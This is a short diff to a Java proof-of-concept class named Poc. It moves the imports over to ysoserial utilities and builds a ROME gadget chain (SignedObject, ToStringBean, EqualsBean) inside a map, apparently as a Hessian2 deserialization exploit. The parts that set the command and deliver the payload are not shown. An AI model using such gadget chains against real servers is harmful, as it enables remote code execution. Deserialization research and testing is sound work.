@@ -1,17 +1,16 @@
 import com.rometools.rome.feed.impl.EqualsBean;
 import com.rometools.rome.feed.impl.ToStringBean;
-import myframework.HttpRequest;
-import myframework.ser.Gadgets;
-import myframework.ser.Hessian2;
 
-import java.util.HashMap;
-
-import myframework.ser.Reflections;
-import myframework.ser.Serializer;
+import ysoserial.Serializer;
 import ysoserial.payloads.Eval;
 import ysoserial.payloads.RomeTools;
+import ysoserial.payloads.util.Gadgets;
+import ysoserial.payloads.util.HttpRequest;
+import ysoserial.payloads.util.Reflections;
+import ysoserial.payloads.util.ser.Hessian2;
 
 import java.security.SignedObject;
+import java.util.Map;
 
 public class Poc {
     public static void main(String[] args) throws Exception{
@@ -29,7 +28,7 @@ public class Poc {
         ToStringBean item = new ToStringBean(signedObject.getClass(), signedObject);
         EqualsBean root = new EqualsBean(ToStringBean.class, item);
 
-        HashMap map = Gadgets.createMap(root,1);
+        Map map = Gadgets.createMap(root,1);
 
         return map;
     }
